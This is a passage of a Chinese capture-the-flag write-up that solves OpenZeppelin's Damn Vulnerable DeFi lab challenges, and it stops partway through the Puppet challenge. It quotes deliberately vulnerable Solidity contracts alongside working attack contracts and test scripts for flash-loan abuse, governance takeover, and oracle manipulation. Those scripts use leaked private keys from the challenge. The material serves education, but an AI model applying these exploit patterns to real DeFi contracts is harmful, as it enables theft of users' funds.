> 原文链接: https://www.anquanke.com//post/id/232932 


# Damn Vulnerable DeFi 题解


                                阅读量   
                                **148131**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p4.ssl.qhimg.com/t01c567bb7af7080350.jpg)](https://p4.ssl.qhimg.com/t01c567bb7af7080350.jpg)



## 前言

[OpenZeppelin](https://openzeppelin.com/) 设计的关于 DeFi 的八道题目，做起来挺有意思的，特定分享一下解题过程，挑战地址：[https://www.damnvulnerabledefi.xyz/](https://www.damnvulnerabledefi.xyz/)



### <a class="reference-link" name="DeFi"></a>DeFi

DeFi 是 decentralized finance 的缩写，所谓去中心化金融，是指旨在破坏金融中间机构的各种加密货币或区块链金融应用的总称。



## 解题流程
<li>克隆[仓库](https://github.com/OpenZeppelin/damn-vulnerable-defi/tree/v1.0.0)
</li>
1. 使用 `npm install` 安装依赖
1. 在 test 文件夹里，每个不同的题目文件夹里有着对应的 `*.challenge.js`，我们需要完成里面留空的代码
1. 运行 `npm run challenge-name` 测试我们构造的 exploit 能否成功利用


## Unstoppable

> There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.
If only there was a way to attack and stop the pool from offering flash loans …
You start with 100 DVT tokens in balance.

第一道属于签到难度，主要让玩家熟悉如何完成操作。下面来看提供借贷功能的合约：

```
contract UnstoppableLender is ReentrancyGuard `{`
    using SafeMath for uint256;

    IERC20 public damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) public `{`
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    `}`

    function depositTokens(uint256 amount) external nonReentrant `{`
        require(amount &gt; 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance.add(amount);
    `}`

    function flashLoan(uint256 borrowAmount) external nonReentrant `{`
        require(borrowAmount &gt; 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore &gt;= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);

        damnValuableToken.transfer(msg.sender, borrowAmount);

        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter &gt;= balanceBefore, "Flash loan hasn't been paid back");
    `}`

`}`
```

可以看到条件 `assert(poolBalance == balanceBefore);` 设计的非常奇怪，特别是 `poolBalance` 只会在 `depositTokens()` 被调用的时候增加，这意味着如果通过 ERC20 标准的 transfer 将 token 转移到 pool 上时，`balanceBefore` 会增加，因为余额增加了，但 `poolBalance` 不会增加， `poolBalance &lt; balanceBefore`，后续的 `flashLoan()` 调用会一直失败。

打开 `test/unstoppable/unstoppable.challenge.js`，在 `it('Exploit'` 处增加以下代码，将我们拥有的 token 全部转给 pool：

```
it('Exploit', async function () `{`
  await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, `{` from: attacker`}` );
`}`);
```

运行 `npm run unstoppable`，成功通过本题：

[![](https://p3.ssl.qhimg.com/t01ff28c7597c62822b.png)](https://p3.ssl.qhimg.com/t01ff28c7597c62822b.png)



## Naive receiver

> There’s a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
Drain all ETH funds from the user’s contract. Doing it in a single transaction is a big plus 😉

本题要求我们清空用户合约中的全部余额，阅读 `NaiveReceiverLenderPool` 的源代码：

```
contract NaiveReceiverLenderPool is ReentrancyGuard `{`
    using SafeMath for uint256;
    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) `{`
        return FIXED_FEE;
    `}`

    function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant `{`

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore &gt;= borrowAmount, "Not enough ETH in pool");


        require(address(borrower).isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        (bool success, ) = borrower.call`{`value: borrowAmount`}`(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            )
        );
        require(success, "External call failed");

        require(
            address(this).balance &gt;= balanceBefore.add(FIXED_FEE),
            "Flash loan hasn't been paid back"
        );
    `}`

    // Allow deposits of ETH
    receive () external payable `{``}`
`}`
```

很明显调用一次 `flashLoan()` 就可以让合约账户减少 1 ETH，那么持续调用即可顺利清空合约：

```
it('Exploit', async function () `{`
    while(await balance.current(this.receiver.address) &gt; 0) `{`
        await this.pool.flashLoan(this.receiver.address, 0);
    `}`
`}`);
```

不过单次交易的方法需要更长的时间，更简单的方法是直接写一个攻击的合约并调用：

```
pragma solidity ^0.6.0;

contract AttackReceiver `{`
    function attack(address payable pool, address payable receiver) public `{`
        while(receiver.balance &gt; 0) `{`
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    receiver,
                    0
                )
            );
            require(success, "External call failed");
        `}`
    `}`

`}`
```

```
const AttackReceiver = contract.fromArtifact('AttackReceiver');

it('Exploit', async function () `{`
    const attack = await AttackReceiver.new();
    await attack.attack(this.pool.address, this.receiver.address, `{` from: attacker `}`);
`}`
```

[![](https://p2.ssl.qhimg.com/t01eec7ae34bfe5450e.png)](https://p2.ssl.qhimg.com/t01eec7ae34bfe5450e.png)



## Truster

> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
Currently the pool has 1 million DVT tokens in balance. And you have nothing.
But don’t worry, you might be able to steal them all from the pool.

本题要求获得贷款池中的全部余额，合约本身很简单：

```
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract TrusterLenderPool is ReentrancyGuard `{`

    IERC20 public damnValuableToken;

    constructor (address tokenAddress) public `{`
        damnValuableToken = IERC20(tokenAddress);
    `}`

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    `{`
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore &gt;= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        (bool success, ) = target.call(data);
        require(success, "External call failed");

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter &gt;= balanceBefore, "Flash loan hasn't been paid back");
    `}`

`}`
```

可以看到合约使用了 call 来实现任意交易的调用，但这也意味着极大的安全隐患，我们可以让合约执行任意的操作，比如调用 `approve()` 函数，允许我们从合约账户上进行转账，这里不直接调用 `tranfser()` 函数的原因是调用完成后不能满足 `balanceAfter &gt;= balanceBefore` 的要求。

解决的思路也非常直接，利用 abi 编码 data 后，像贷款池调用 `flashLoan()` 租借 0 元，然后等待合约执行完成 `approve()` 函数，然后直接从 token 处取走相应的金额：

```
it('Exploit', async function () `{`
    const data = web3.eth.abi.encodeFunctionCall(`{`
        name: 'approve',
        type: 'function',
        inputs: [`{`
            type: 'address',
            name: 'spender'
        `}`,`{`
            type: 'uint256',
            name: 'amount'
        `}`]
    `}`, [attacker, TOKENS_IN_POOL.toString()]); 

    await this.pool.flashLoan(0, attacker, this.token.address, data);
    await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, `{` from: attacker `}`);
`}`);
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0151d7814b4111c5a7.png)



## Side entrance

> A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.
This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
You must steal all ETH from the lending pool.

本题考点同样是从贷款池中提走全部的 token，但不同于上题的直接提供 `call` 进行调用，本题限定了只能调用 receiver 的 `execute()` 函数：

```
interface IFlashLoanEtherReceiver `{`
    function execute() external payable;
`}`

contract SideEntranceLenderPool `{`
    using Address for address payable;

    mapping (address =&gt; uint256) private balances;

    function deposit() external payable `{`
        balances[msg.sender] += msg.value;
    `}`

    function withdraw() external `{`
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.sendValue(amountToWithdraw);
    `}`

    function flashLoan(uint256 amount) external `{`
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore &gt;= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute`{`value: amount`}`();

        require(address(this).balance &gt;= balanceBefore, "Flash loan hasn't been paid back");        
    `}`
`}`
```

但仔细审计源代码之后发现本题的漏洞也非常明显，如果从贷款池中借出一定量的 ETH 并通过 `deposit()` 函数将这部分 ETH 存入，那么在满足 `address(this).balance &gt;= balanceBefore` 的同时，`balances[msg.sender]` 也会增加。然后我们再通过 `withdraw()` 函数取出，即可顺利提空贷款池中的内部金额。根据逻辑构造攻击合约：

```
interface IFlashLoanEtherReceiver `{`
    function execute() external payable;
`}`

interface ISideEntranceLenderPool `{`
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
`}`

contract AttackSideEntrance is IFlashLoanEtherReceiver `{`
    using Address for address payable;

    ISideEntranceLenderPool pool;

    function attack(ISideEntranceLenderPool _pool) public `{`
        pool = _pool;
        pool.flashLoan(address(_pool).balance);
        pool.withdraw();
        msg.sender.sendValue(address(this).balance);
    `}`

    function execute() external payable override `{`
        pool.deposit`{`value:msg.value`}`();
    `}`

    receive() external payable`{``}`
`}`
```

```
const AttackSideEntrance = contract.fromArtifact('AttackSideEntrance');
// ...
it('Exploit', async function () `{`
    const attack = await AttackSideEntrance.new();
    await attack.attack(this.pool.address, `{` from: attacker `}`);
`}`);
```

[![](https://p0.ssl.qhimg.com/t0123eb5f566a0a7aec.png)](https://p0.ssl.qhimg.com/t0123eb5f566a0a7aec.png)



## The rewarder

> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
You don’t have any DVT tokens. Luckily, these are really popular nowadays, so there’s another pool offering them in free flash loans.
In the upcoming round, you must claim all rewards for yourself.

本题要求我们获得全部奖励的 token 并且让其他人不能获得收益。阅读合约代码，发现该合约会每隔五天根据用户 token 的余额快照来发放奖励，奖励的额度跟池中全部的 token 数目和用户存入的 token 数目有关：

```
contract TheRewarderPool `{`

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address =&gt; uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;

    // Token in which rewards are issued
    RewardToken public rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) public `{`
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    `}`

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external `{`
        require(amountToDeposit &gt; 0, "Must deposit tokens");

        accToken.mint(msg.sender, amountToDeposit);
        distributeRewards();

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    `}`

    function withdraw(uint256 amountToWithdraw) external `{`
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    `}`

    function distributeRewards() public returns (uint256) `{`
        uint256 rewardInWei = 0;

        if(isNewRewardsRound()) `{`
            _recordSnapshot();
        `}`        

        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (totalDeposits &gt; 0) `{`
            uint256 reward = (amountDeposited * 100) / totalDeposits;

            if(reward &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) `{`                
                rewardInWei = reward * 10 ** 18;
                rewardToken.mint(msg.sender, rewardInWei);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            `}`
        `}`

        return rewardInWei;     
    `}`

    function _recordSnapshot() private `{`
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    `}`

    function _hasRetrievedReward(address account) private view returns (bool) `{`
        return (
            lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp &amp;&amp;
            lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    `}`

    function isNewRewardsRound() public view returns (bool) `{`
        return block.timestamp &gt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    `}`
`}`
```

但这种奖励在设计上是存在一定问题的，因为它依赖的是某个时间节点的信息，而非连续性的节点，这意味着如果我们能在某个时间节点进行操作，完全可以影响奖励的发放。考虑到 `FlashLoanerPool` 提供的贷款功能，如果我们在某个时间节点借走了池中全部的 token 并通过 `deposit()` 函数放入 `TheRewarderPool`，主动触发 `distributeRewards()` 获得奖励，由于池中拥有的 1000000 ether 远远大于其他人存入的 100 ether，所以根据计算公式 `reward = (amountDeposited * 100) / totalDeposits`，最后其他人的收益会变成 0。

根据思路，编写部署合约并测试：

```
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

import "../DamnValuableToken.sol";

interface IFlashLoanerPool `{`
    function flashLoan(uint256 amount) external;
`}`

interface ITheRewarderPool `{`
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;

    function distributeRewards() external returns (uint256);

    function isNewRewardsRound() external view returns (bool);
`}`

/**
 * @notice A mintable ERC20 token to issue rewards
 */
contract RewardToken is ERC20, AccessControl `{`

    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() public ERC20("Reward Token", "RWT") `{`
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _setupRole(MINTER_ROLE, msg.sender);
    `}`

    function mint(address to, uint256 amount) external `{`
        require(hasRole(MINTER_ROLE, msg.sender));
        _mint(to, amount);
    `}`
`}`

contract AttackReward `{`
    DamnValuableToken public liquidityToken;
    RewardToken public rewardToken;
    IFlashLoanerPool public flashLoanerPool;
    ITheRewarderPool public theRewarderPool;

    constructor(address liquidityTokenAddress, address rewardTokenAddress, IFlashLoanerPool _flashLoanerPool, ITheRewarderPool _theRewarderPool) public `{`
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        flashLoanerPool = _flashLoanerPool;
        theRewarderPool = _theRewarderPool;
    `}`

    function attack(uint256 amount) public `{`
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    `}`

    function receiveFlashLoan(uint256 amount) public `{`
        liquidityToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
    `}`
`}`
```

```
it('Exploit', async function () `{`
    await time.increase(time.duration.days(5));
    const attack = await AttackReward.new(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address, `{` from: attacker`}`);
    await attack.attack(TOKENS_IN_LENDER_POOL, `{` from: attacker `}`);
`}`);
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019800192e6eb3e6a5.png)



## Selfie

> A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.
Wow, and it even includes a really fancy governance mechanism to control it.
What could go wrong, right ?
You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: steal them all.

同样的清空贷款池挑战，直接阅读源代码：

```
contract SelfiePool is ReentrancyGuard `{`

    using Address for address payable;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() `{`
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    `}`

    constructor(address tokenAddress, address governanceAddress) public `{`
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    `}`

    function flashLoan(uint256 borrowAmount) external nonReentrant `{`
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore &gt;= borrowAmount, "Not enough tokens in pool");

        token.transfer(msg.sender, borrowAmount);        

        require(msg.sender.isContract(), "Sender must be a deployed contract");
        (bool success,) = msg.sender.call(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        require(success, "External call failed");

        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter &gt;= balanceBefore, "Flash loan hasn't been paid back");
    `}`

    function drainAllFunds(address receiver) external onlyGovernance `{`
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    `}`
`}`
```

可以看到有一个函数很有意思，`drainAllFunds()` 会将全部的余额转给 receiver，但修饰符 `onlyGovernance` 限定了调用者，继续阅读相应的 `SimpleGovernance` 合约，可以发现 `SimpleGovernance` 合约的 `executeAction()` 预留了 call 函数来进行任意调用：

```
contract SimpleGovernance `{`
    // 省略
    function executeAction(uint256 actionId) external payable `{`
        require(_canBeExecuted(actionId), "Cannot execute this action");

        GovernanceAction storage actionToExecute = actions[actionId];
        actionToExecute.executedAt = block.timestamp;

        (bool success,) = actionToExecute.receiver.call`{`
            value: actionToExecute.weiAmount
        `}`(actionToExecute.data);

        require(success, "Action failed");

        emit ActionExecuted(actionId, msg.sender);
    `}`

    function getActionDelay() public view returns (uint256) `{`
        return ACTION_DELAY_IN_SECONDS;
    `}`

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) `{`
        GovernanceAction memory actionToExecute = actions[actionId];
        return (
            actionToExecute.executedAt == 0 &amp;&amp;
            (block.timestamp - actionToExecute.proposedAt &gt;= ACTION_DELAY_IN_SECONDS)
        );
    `}`
`}`
```

这提醒了我们，如果能利用这里的 call，调用 `drainAllFunds()` 函数，即可顺利解决本题。继续阅读调用的条件：

```
function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) `{`
    require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
    require(receiver != address(this), "Cannot queue actions that affect Governance");

    uint256 actionId = actionCounter;

    GovernanceAction storage actionToQueue = actions[actionId];
    actionToQueue.receiver = receiver;
    actionToQueue.weiAmount = weiAmount;
    actionToQueue.data = data;
    actionToQueue.proposedAt = block.timestamp;

    actionCounter++;

    emit ActionQueued(actionId, msg.sender);
    return actionId;
`}`

function _hasEnoughVotes(address account) private view returns (bool) `{`
    uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
    uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
    return balance &gt; halfTotalSupply;
`}`
```

很明显我们可以通过贷款池的贷款操作，满足 `_hasEnoughVotes()` 的条件，然后构造好特定 data 后传入 `queueAction()` 函数，然后归还贷款，最后执行 `executeAction()` 函数，触发我们的 payload，成功清空贷款池。根据思路编写并部署攻击合约，成功利用：

```
pragma solidity ^0.6.0;

import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool `{`
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
`}`

interface ISimpleGovernance `{`
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
`}`

contract AttackSelfie `{`
    address public owner;
    ISelfiePool public pool;
    ISimpleGovernance public governance;
    uint256 public actionId;

    constructor(ISelfiePool _pool, ISimpleGovernance _governance) public `{`
        owner = msg.sender;
        pool = _pool;
        governance = _governance;
    `}`

    function attack0(uint256 amount) public `{`
        pool.flashLoan(amount);
    `}`

    function receiveTokens(address _token, uint256 _amount) public `{`
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(_token);

        token.snapshot();

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

        actionId = governance.queueAction(address(pool), data, 0);

        token.transfer(address(pool), _amount);
    `}`

    function attack1() public `{`
        governance.executeAction(actionId);
    `}`
`}`
```

```
const AttackReward = contract.fromArtifact('AttackReward');

it('Exploit', async function () `{`
    await time.increase(time.duration.days(5));
    const attack = await AttackReward.new(this.liquidityToken.address, this.rewardToken.address, this.flashLoanPool.address, this.rewarderPool.address, `{` from: attacker`}`);
    await attack.attack(TOKENS_IN_LENDER_POOL, `{` from: attacker `}`);
`}`);
```

[![](https://p2.ssl.qhimg.com/t01640c6d0ecc329670.png)](https://p2.ssl.qhimg.com/t01640c6d0ecc329670.png)



## Compromised

> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:
<pre><code class="hljs">          HTTP/2 200 OK
          content-type: text/html
          content-language: en
          vary: Accept-Encoding
          server: cloudflare

          4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

          4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
</code></pre>
A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each
This price is fetched from an on-chain oracle, and is based on three trusted reporters: `0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15` and `0x81A5D6E50C214044bE44cA0CB057fe119097850c`.
You must steal all ETH available in the exchange.

本题要求我们从交换所中提走全部的 ETH，阅读交换所的合约代码：

```
contract Exchange is ReentrancyGuard `{`

    using SafeMath for uint256;
    using Address for address payable;

    DamnValuableNFT public token;
    TrustfulOracle public oracle;

    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);

    constructor(address oracleAddress) public payable `{`
        token = new DamnValuableNFT();
        oracle = TrustfulOracle(oracleAddress);
    `}`

    function buyOne() external payable nonReentrant returns (uint256) `{`
        uint256 amountPaidInWei = msg.value;
        require(amountPaidInWei &gt; 0, "Amount paid must be greater than zero");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(amountPaidInWei &gt;= currentPriceInWei, "Amount paid is not enough");

        uint256 tokenId = token.mint(msg.sender);

        msg.sender.sendValue(amountPaidInWei - currentPriceInWei);

        emit TokenBought(msg.sender, tokenId, currentPriceInWei);
    `}`

    function sellOne(uint256 tokenId) external nonReentrant `{`
        require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
        require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(address(this).balance &gt;= currentPriceInWei, "Not enough ETH in balance");

        token.transferFrom(msg.sender, address(this), tokenId);
        token.burn(tokenId);

        msg.sender.sendValue(currentPriceInWei);

        emit TokenSold(msg.sender, tokenId, currentPriceInWei);
    `}`

    receive() external payable `{``}`
`}`
```

可以发现无论是卖出还是买入，其价格均由 `oracle.getMedianPrice(token.symbol());` 决定，而定位相应的源码，可以发现真正的计算公式如下：

```
function _computeMedianPrice(string memory symbol) private view returns (uint256) `{`
    uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

    // calculate median price
    if (prices.length % 2 == 0) `{`
        uint256 leftPrice = prices[(prices.length / 2) - 1];
        uint256 rightPrice = prices[prices.length / 2];
        return (leftPrice + rightPrice) / 2;
    `}` else `{`
        return prices[prices.length / 2];
    `}`
`}`
```

而唯一修改价格的方式如下：

```
modifier onlyTrustedSource() `{`
    require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
    _;
`}`

function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource `{`
    _setPrice(msg.sender, symbol, newPrice);
`}`

function _setPrice(address source, string memory symbol, uint256 newPrice) private `{`
    uint256 oldPrice = pricesBySource[source][symbol];
    pricesBySource[source][symbol] = newPrice;
    emit UpdatedPrice(source, symbol, oldPrice, newPrice);
`}`
```

这意味着，当且仅当我们控制了 TrustedSource，我们就能控制购买的价格。此时恰好发现，题目提供的信息其实是其中两个 TrustedSource 的私钥：

```
#!/usr/bin/env python2

def get_private_key(bytes):
    return ''.join(bytes.split(' ')).decode('hex').decode('base64')

get_private_key('4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35')
# 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9 =&gt; 0xe92401A4d3af5E446d93D11EEc806b1462b39D15
get_private_key('4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34')
# 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 =&gt; 0x81A5D6E50C214044bE44cA0CB057fe119097850c
```

通过我们控制的 TrustedSource，我们能任意修改买入卖出的价格，最后编写利用的代码如下：

```
it('Exploit', async function () `{`
    const leakedAccounts = ['0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'].map(pk=&gt;web3.eth.accounts.privateKeyToAccount(pk));

    for (let account of leakedAccounts) `{`
        await web3.eth.personal.importRawKey(account.privateKey, '');
        web3.eth.personal.unlockAccount(account.address, '', 999999);
        // 修改最低价
        await this.oracle.postPrice('DVNFT', 0, `{` from: account.address `}`);
    `}`
    // 买入
    await this.exchange.buyOne(`{` from: attacker, value: 1 `}`);
    // 修改为最高价格
    const exchangeBalance = await balance.current(this.exchange.address);
    await this.oracle.postPrice("DVNFT", exchangeBalance, `{` from: leakedAccounts[0].address`}`);
    await this.oracle.postPrice("DVNFT", exchangeBalance, `{` from: leakedAccounts[1].address`}`);
    await this.token.approve(this.exchange.address, 1, `{` from: attacker `}`);
    // 卖出
    await this.exchange.sellOne(1, `{` from: attacker `}`)
`}`);
```

[![](https://p5.ssl.qhimg.com/t0181ecd9ecbc5152b9.png)](https://p5.ssl.qhimg.com/t0181ecd9ecbc5152b9.png)



## Puppet

> There’s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 10000 DVTs in liquidity.
There’s a DVT market opened in an [Uniswap v1 exchange](https://uniswap.org/docs/v1/), currently with 10 ETH and 10 DVT in liquidity.
Starting with 100 ETH and 100 DVTs in balance, you must steal as many tokens as possible from the lending pool. And at the end of the attack, your ETH balance shouldn’t have decreased.

题目最核心的代码 `borrow()` 函数会根据传入的 ETH 数目，借出对应数目的 token，其中数目计算的关键在于 `computeOraclePrice()` 函数:

```
function borrow(uint256 borrowAmount) public payable nonReentrant `{`
    uint256 amountToDeposit = msg.value;

    uint256 tokenPriceInWei = computeOraclePrice();
    uint256 depositRequired = borrowAmount.mul(tokenPriceInWei) * 2;

    require(amountToDeposit &gt;= depositRequired, "Not depositing enough collateral");
    if (amountToDeposit &gt; depositRequired) `{`
        uint256 amountToReturn = amountToDeposit - depositRequired;
        amountToDeposit -= amountToReturn;
        msg.sender.sendValue(amountToReturn);
    `}`        

    deposits[msg.sender] += amountToDeposit;

